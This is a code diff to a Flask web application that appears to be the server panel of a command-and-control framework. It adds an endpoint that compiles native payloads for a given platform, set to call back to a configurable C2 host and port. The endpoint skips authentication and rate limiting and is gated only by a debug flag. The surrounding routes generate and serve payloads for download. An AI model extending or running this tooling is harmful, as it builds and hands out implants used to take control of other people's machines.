@@ -792,7 +792,7 @@ def export_commands():
     except Exception as e:
         return jsonify({'error': str(e)}), 500
 
-@app.route('/api/generate-payload', methods=['POST'])
+@app.route('/api/generate-payload', methods=['POST', 'OPTIONS'])
 @login_required
 @limiter.limit("5 per hour")  # Limit payload generation
 def generate_payload():
@@ -927,6 +927,38 @@ def configure_payload():
         return jsonify({'status': 'success', 'message': 'Payload configured'})
     except Exception as e:
         return jsonify({'status': 'error', 'message': str(e)}), 500
+
+# Development test endpoint (remove in production!)
+@app.route('/api/test-native-payload', methods=['POST'])
+def test_native_payload():
+    """Test endpoint for native payload generation - DEV ONLY"""
+    if not app.debug:
+        return jsonify({'error': 'Not available in production'}), 403
+        
+    try:
+        from native_payload_builder import native_builder
+        
+        data = request.json or {}
+        config = {
+            'platform': data.get('platform', 'linux'),
+            'c2_host': data.get('c2_host', 'localhost'),
+            'c2_port': data.get('c2_port', 4433)
+        }
+        
+        result = native_builder.compile_payload(config)
+        
+        if result['success']:
+            return jsonify({
+                'success': True,
+                'path': str(result['path']),
+                'size': result['size'],
+                'hash': result['hash']
+            })
+        else:
+            return jsonify({'success': False, 'error': result['error']}), 500
+            
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)}), 500
 
 @app.route('/api/download-payload')
 @login_required
